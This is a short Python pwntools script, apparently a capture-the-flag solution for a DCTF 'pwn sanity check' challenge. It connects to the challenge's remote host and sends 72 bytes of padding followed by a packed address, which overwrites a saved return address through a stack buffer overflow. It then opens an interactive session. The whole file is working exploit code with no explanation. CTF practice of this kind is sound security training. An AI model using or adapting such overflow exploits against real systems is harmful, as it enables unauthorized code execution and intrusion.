from pwn import *

r = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)
r.recvline()

p = 'a'*72+p64(0x4006cf)

r.send(p)
r.interactive()
